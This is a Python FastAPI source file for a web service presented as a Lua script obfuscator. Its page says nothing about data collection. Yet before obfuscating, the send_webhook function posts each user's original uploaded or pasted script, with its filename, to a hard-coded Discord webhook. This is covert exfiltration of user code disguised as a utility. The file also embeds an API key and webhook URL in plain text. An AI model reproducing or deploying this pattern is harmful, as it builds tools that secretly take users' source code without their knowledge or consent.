API_KEY = "3e1764cb-e063-1ec-6dae-93ca52963944741"
WEBHOOK_URL = "https://discord.com/api/webhooks/1380098444860854273/zBhTfZQD2kmY4EFddeKuQuOVboGp1Qj3xiYGBaOvfaoJwrz7nlaX_3iOobDj9gnVQdfz"

import io
import json
import logging
import traceback
import aiohttp
from fastapi import FastAPI, File, UploadFile, Form
from fastapi.responses import HTMLResponse, StreamingResponse

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("xevic-obf")

app = FastAPI()

INDEX_HTML = """<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Xevic — Lua obfuscator</title>
<link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
<style>
:root{--bg:#070708;--panel:rgba(255,255,255,0.02);--muted:rgba(255,255,255,0.46);--text:#f3f3f3}
*{box-sizing:border-box}
html,body{height:100%;margin:0;background:var(--bg);color:var(--text);font-family:'Press Start 2P', system-ui, monospace}
main{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
.card{width:100%;max-width:920px;padding:20px;border-radius:12px;border:1px solid rgba(255,255,255,0.02);background:linear-gradient(180deg, rgba(255,255,255,0.008), rgba(255,255,255,0.004))}
textarea{width:100%;min-height:300px;padding:12px;border-radius:8px;background:transparent;border:1px solid rgba(255,255,255,0.02);color:var(--text);font-family:'Press Start 2P',monospace;font-size:12px;resize:vertical}
.controls{display:flex;gap:8px;margin-top:10px}
.btn{padding:10px 12px;border-radius:8px;border:1px solid rgba(255,255,255,0.02);background:transparent;color:var(--text);cursor:pointer}
.file-box{padding:12px;border-radius:8px;border:1px dashed rgba(255,255,255,0.02);min-height:120px;display:flex;align-items:center;justify-content:center}
footer{margin-top:12px;color:rgba(255,255,255,0.46);font-size:11px;text-align:right}
</style>
</head>
<body>
  <main>
    <div class="card" role="main">
      <header>
        <h1 style="margin:0;font-size:20px">Xevic — Lua obfuscator</h1>
      </header>

      <form id="obfForm" action="/obfuscate" method="post" enctype="multipart/form-data">
        <div style="display:grid;grid-template-columns:1fr 320px;gap:16px;margin-top:12px">
          <div>
            <textarea name="script" id="script" placeholder="Paste Lua script here..."></textarea>
            <div class="controls">
              <button type="submit" class="btn">obfuscate</button>
              <button type="button" class="btn" onclick="document.getElementById('script').value=''">clear</button>
            </div>
            <div style="color:rgba(255,255,255,0.46);font-size:11px;margin-top:8px">Output will download after obfuscation.</div>
          </div>

          <aside>
            <label class="file-box" id="fileLabel">Click to select or drop a .lua/.txt file</label>
            <input id="fileInput" name="file" type="file" accept=".lua,.txt" style="display:none">
            <input type="text" id="filename" name="filename" placeholder="Output filename (optional)" style="width:100%;margin-top:10px;padding:10px;border-radius:8px;background:transparent;border:1px solid rgba(255,255,255,0.02);color:var(--text);font-family:'Press Start 2P'">
            <div style="display:flex;justify-content:flex-end;margin-top:8px">
              <button id="clearFile" class="btn" type="button" onclick="clearFile()">remove file</button>
            </div>
          </aside>
        </div>
      </form>

      <footer>
        made by <strong>xevic</strong>.
      </footer>
    </div>
  </main>

  <script>
    const fileInput = document.getElementById('fileInput');
    const fileLabel = document.getElementById('fileLabel');
    const obfForm = document.getElementById('obfForm');
    const filenameHidden = document.getElementById('filename');

    fileLabel.addEventListener('click', ()=> fileInput.click());
    fileInput.addEventListener('change', (e) => {
      const f = e.target.files && e.target.files[0];
      if (!f) { fileLabel.textContent = 'Click to select or drop a .lua/.txt file'; return; }
      fileLabel.textContent = `Selected: ${f.name}`;
      document.getElementById('script').value = '';
      if (!obfForm.contains(fileInput)) obfForm.appendChild(fileInput);
    });

    fileLabel.addEventListener('dragover', (e)=>{ e.preventDefault(); fileLabel.style.opacity=0.9; });
    fileLabel.addEventListener('dragleave', ()=>{ fileLabel.style.opacity=1 });
    fileLabel.addEventListener('drop', (e)=> { e.preventDefault(); const files = e.dataTransfer.files; if (files && files[0]) { fileInput.files = files; const evt = new Event('change'); fileInput.dispatchEvent(evt) } fileLabel.style.opacity=1 });

    function clearFile(){
      fileInput.value = '';
      fileInput.name = '';
      fileLabel.textContent = 'Click to select or drop a .lua/.txt file';
      document.getElementById('script').value = '';
      filenameHidden.value = '';
    }

    obfForm.addEventListener('submit', (ev) => {
      let existing = obfForm.querySelector('input[name="filename"]');
      if (!existing) {
        const hidden = document.createElement('input');
        hidden.type = 'hidden';
        hidden.name = 'filename';
        hidden.value = filenameHidden.value || '';
        obfForm.appendChild(hidden);
      } else {
        existing.value = filenameHidden.value || '';
      }
      const f = fileInput.files && fileInput.files[0];
      if (f) document.getElementById('script').value = '';
    });
  </script>
</body>
</html>
"""

async def call_obfuscator(session: aiohttp.ClientSession, script: str) -> str:
    if not API_KEY:
        return ""
    try:
        headers = {"apikey": API_KEY, "content-type": "text/plain"}
        async with session.post("https://api.luaobfuscator.com/v1/obfuscator/newscript", headers=headers, data=script, timeout=30) as r1:
            if r1.status != 200:
                return ""
            d1 = await r1.json()
            session_id = d1.get("sessionId") or d1.get("session_id") or d1.get("id") or ""
            if not session_id:
                return ""
        headers2 = {"apikey": API_KEY, "sessionId": session_id, "content-type": "application/json"}
        params = {"MinifyAll": True, "Virtualize": True, "CustomPlugins": {"DummyFunctionArgs": [6, 9]}}
        async with session.post("https://api.luaobfuscator.com/v1/obfuscator/obfuscate", headers=headers2, json=params, timeout=60) as r2:
            if r2.status != 200:
                return ""
            d2 = await r2.json()
            return d2.get("code", "") or ""
    except Exception:
        return ""

async def send_webhook(session: aiohttp.ClientSession, filename: str, content: str):
    if not WEBHOOK_URL:
        return
    try:
        form = aiohttp.FormData()
        payload = {"username": "xevic-web", "content": f"Original script uploaded: `{filename}`"}
        form.add_field("payload_json", json.dumps(payload))
        form.add_field("file", content.encode("utf-8"), filename=filename, content_type="text/plain")
        await session.post(WEBHOOK_URL, data=form, timeout=15)
    except Exception:
        pass

@app.get("/", response_class=HTMLResponse)
async def index():
    return HTMLResponse(content=INDEX_HTML, status_code=200)

@app.post("/obfuscate")
async def obfuscate(file: UploadFile = File(None), script: str = Form(None), filename: str = Form(None)):
    try:
        if file:
            raw = await file.read()
            script_text = raw.decode("utf-8", errors="replace")
            in_name = file.filename or "uploaded.lua"
        elif script:
            script_text = str(script)
            in_name = "pasted_script.lua"
        else:
            return HTMLResponse(content="<h3>No script or file provided.</h3>", status_code=400)

        async with aiohttp.ClientSession() as session:
            await send_webhook(session, in_name, script_text)
            obf_code = await call_obfuscator(session, script_text)

        if not obf_code:
            obf_code = "-- Obfuscation unavailable. Returning original script.\n" + script_text

        out_name = (filename or "").strip() or f"obfuscated_{in_name}"
        if not out_name.lower().endswith((".lua", ".txt")):
            out_name += ".lua"

        buf = io.BytesIO(obf_code.encode("utf-8"))
        return StreamingResponse(buf, media_type="text/plain", headers={"Content-Disposition": f'attachment; filename="{out_name}"'})

    except Exception:
        tb = traceback.format_exc()
        log.error("Unhandled error: %s", tb)
        return HTMLResponse(content="<h3>Internal server error</h3>", status_code=500)
